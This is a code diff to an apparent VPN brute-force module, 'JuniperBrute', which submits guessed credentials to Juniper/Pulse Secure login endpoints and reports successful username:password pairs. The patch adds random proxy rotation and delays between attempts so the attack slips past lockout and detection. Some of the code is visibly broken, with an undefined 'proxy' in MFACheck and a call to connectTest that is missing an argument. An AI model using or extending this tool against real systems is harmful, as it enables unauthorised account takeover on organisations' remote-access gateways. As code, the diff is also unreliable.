@@ -6,6 +6,8 @@ from requests import session
 import requests
 import re
 from argparse import ArgumentParser
+import random
+
 
 class JuniperBrute(webModule):
     def __init__(self, config, display, lock):
@@ -25,7 +27,7 @@ class JuniperBrute(webModule):
 
     def MFACheck(self, c, config, URL):
         print("[!] Checking to see if MultiFactor Authentication is required for " + URL + "...")
-        mfa = c.get(config["HOST"] + '/dana-na/auth/' + URL + '/welcome.cgi', allow_redirects=False, verify=False)
+        mfa = c.get(config["HOST"] + '/dana-na/auth/' + URL + '/welcome.cgi', allow_redirects=False, verify=False, proxies=proxy)
         m = re.findall('<input (.*?)>', mfa.text, re.DOTALL)
         n = re.findall('password', str(m))
         o = re.search('Missing certificate', mfa.text)
@@ -41,11 +43,12 @@ class JuniperBrute(webModule):
             return False
     def connectTest(self, config, payload, URL):
         with session() as c:
+            proxy = random.choice(config["proxies"])
             if 'url_default' in self.nomfaurls:
                 URL = 'url_default'
             else:
                 URL = self.nomfaurls[0]
-            cpost = c.post(config["HOST"] + '/dana-na/auth/' + URL + '/login.cgi', data=payload, allow_redirects=False, verify=False)
+            cpost = c.post(config["HOST"] + '/dana-na/auth/' + URL + '/login.cgi', data=payload, allow_redirects=False, verify=False, proxies=proxy)
             m = re.search('p=user-confirm', str(cpost.headers))
             if m:
                 print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
@@ -95,6 +98,7 @@ class JuniperBrute(webModule):
                                     'btnSubmit': 'Sign+In'
                                     }
                                     self.connectTest(config, payload)
+                                    time.sleep(config["timeout"])
                             else:
                                 config["PASSWORD"] = pass_line.strip('\n')
                                 payload = {
@@ -105,6 +109,7 @@ class JuniperBrute(webModule):
                                 'btnSubmit': 'Sign+In'
                                 }
                                 self.connectTest(config, payload)
+                                time.sleep(config["timeout"])
                     elif config["UserFile"]:
                         lines = [line.rstrip('\n') for line in open(config["UserFile"])]
                         for line in lines:
